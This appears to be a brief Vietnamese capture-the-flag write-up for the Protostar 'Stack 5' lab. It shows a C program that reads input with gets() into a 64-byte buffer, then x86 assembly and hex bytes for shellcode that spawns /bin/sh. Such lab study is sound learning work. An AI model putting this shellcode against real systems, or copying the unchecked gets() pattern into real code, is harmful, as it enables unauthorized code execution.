# Stack 5
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

# Ý tưởng khai thác
- Với bài này chúng ta sẽ sử dụng shell code để khai thác.
```
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
add eax, 0x0b
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
```
- Ta thu được đoạn shellcode sau:
```
"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x83\xC0\x0B\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
```



